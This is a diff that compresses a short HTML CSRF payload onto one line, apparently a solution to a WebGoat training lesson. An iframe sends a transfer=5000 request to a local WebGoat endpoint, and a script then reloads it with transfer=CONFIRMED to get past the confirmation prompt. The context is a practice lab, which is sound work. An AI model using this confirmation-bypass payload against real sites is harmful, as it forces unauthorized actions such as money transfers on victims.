@@ -1,7 +1,1 @@
-<iframe id="badimg" src='http://localhost:8010/WebGoat/attack?Screen=2094584595&menu=900&transfer=5000' onload="confirm()"></iframe>
-<script>
-function confirm() {
-	document.getElementById("badimg").onload = "";
-	document.getElementById("badimg").setAttribute("src", "http://localhost:8010/WebGoat/attack?Screen=2094584595&menu=900&transfer=CONFIRMED");
-}
-</script>
+<iframe id="badimg" src='http://localhost:8010/WebGoat/attack?Screen=2094584595&menu=900&transfer=5000' onload="confirm()"></iframe><script>function confirm() {document.getElementById("badimg").onload = "";document.getElementById("badimg").setAttribute("src", "http://localhost:8010/WebGoat/attack?Screen=2094584595&menu=900&transfer=CONFIRMED");}</script>
